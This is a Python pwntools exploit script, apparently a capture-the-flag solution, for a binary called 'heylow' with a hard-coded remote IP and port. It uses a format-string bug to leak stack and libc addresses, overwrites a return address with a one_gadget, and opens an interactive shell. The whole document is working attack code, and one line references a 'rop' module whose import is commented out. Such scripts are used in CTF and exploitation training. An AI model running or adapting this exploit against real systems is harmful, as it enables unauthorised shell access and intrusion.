from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./heylow"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x165f+0x555555554000\n')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
	raw_input()
	payload = '80808080'
	payload += '%1$p%3$p'
	payload = payload.ljust(0x400,'a')
	sa('> ',payload)
	ru('before:')
	stack_addr = int(rv(14)[2:],16)
	ret_addr = stack_addr - 0xa0
	lg('stack_addr',stack_addr)
	lg('ret_addr',ret_addr)
	write_addr = int(rv(14)[2:],16) - 0x10
	lg('write',write_addr)
	libc.address = write_addr - libc.symbols['write']
	lg('libc',libc.address)
	system_addr = libc.symbols['system']
	lg('system',system_addr)
	one_gadget = libc.address + 0xf1147
	lg('one_gadget',one_gadget)

	payload = '80808080'
	fmtstr = fmtstr_payload(38,{ret_addr:one_gadget})
	fmt1 = fmtstr.split('%',1)[0]
	fmt2 = fmtstr.split('%',1)[1]
	num = 0
	cnt = 0
	for i in range(len(fmt2)):
		if fmt2[i].isdigit():
			num = num*10 + int(fmt2[i])
			cnt += 1
		else:
			break
	fmt2 = '%' + str(num+64) + fmt2[cnt:]
	fmt2 = fmt2.ljust(0x58,'\x00')
	fmtstr = fmt2 + fmt1
	payload += fmtstr
	payload = payload.ljust(0x400,'\x00')
	sa('> ',payload)
	p.interactive()
hack()
